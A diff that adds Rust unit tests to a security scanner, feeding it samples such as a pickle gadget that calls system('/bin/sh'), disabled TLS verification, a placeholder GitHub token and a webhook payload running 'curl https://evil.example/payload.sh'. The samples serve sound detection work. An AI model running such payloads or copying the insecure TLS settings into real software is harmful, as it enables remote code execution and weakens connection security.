@@ -1302,6 +1302,106 @@ mod comprehensive_tests {
     }
 
     #[test]
+    fn test_pickle_gadget_detection() {
+        let m = matcher_no_ac();
+        let r = m.scan("pickle1", &[("artifact", "cposix\nsystem\n/bin/sh\nR")]);
+        assert!(
+            r.matches
+                .iter()
+                .any(|m| m.pattern_name == "deser_pickle_gadget"),
+            "pickle gadget payload should be detected"
+        );
+    }
+
+    #[test]
+    fn test_dangerous_tls_default_detection() {
+        let m = matcher();
+        let r = m.scan(
+            "tlsdefault1",
+            &[("config", "tlsConfig: { InsecureSkipVerify: true }")],
+        );
+        assert!(
+            r.matches
+                .iter()
+                .any(|m| m.pattern_name == "dangerous_tls_disable_verify"),
+            "unsafe TLS default should be detected"
+        );
+    }
+
+    #[test]
+    fn test_dangerous_legacy_tls_detection() {
+        let m = matcher();
+        let r = m.scan(
+            "tlsdefault2",
+            &[("config", r#"SSLContext.getInstance("TLSv1.1")"#)],
+        );
+        assert!(
+            r.matches
+                .iter()
+                .any(|m| m.pattern_name == "dangerous_legacy_tls_version"),
+            "legacy TLS default should be detected"
+        );
+    }
+
+    #[test]
+    fn test_dangerous_embedded_live_token_detection() {
+        let m = matcher();
+        let r = m.scan(
+            "token1",
+            &[(
+                "config",
+                r#"const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij";"#,
+            )],
+        );
+        assert!(
+            r.matches
+                .iter()
+                .any(|m| m.pattern_name == "dangerous_embedded_live_token"),
+            "embedded live token should be detected"
+        );
+    }
+
+    #[test]
+    fn test_webhook_command_delivery_detection() {
+        let m = matcher();
+        let r = m.scan(
+            "webhook1",
+            &[(
+                "payload",
+                "POST /webhook/github X-GitHub-Event: workflow_job curl https://evil.example/payload.sh",
+            )],
+        );
+        assert!(
+            r.matches
+                .iter()
+                .any(|m| m.pattern_name == "webhook_command_delivery"),
+            "webhook command delivery should be detected"
+        );
+    }
+
+    #[test]
+    fn test_webhook_clean_payload_no_detection() {
+        let m = matcher();
+        let r = m.scan(
+            "webhook2",
+            &[(
+                "payload",
+                "POST /webhook/github X-GitHub-Event: push {\"repository\":\"1sec\"}",
+            )],
+        );
+        let webhook_matches: Vec<_> = r
+            .matches
+            .iter()
+            .filter(|m| m.category == "webhook_abuse")
+            .collect();
+        assert!(
+            webhook_matches.is_empty(),
+            "clean webhook event should not match webhook abuse patterns: {:?}",
+            webhook_matches
+        );
+    }
+
+    #[test]
     fn test_ffmpeg_rce_filter_system() {
         let m = matcher();
         let r = m.scan(
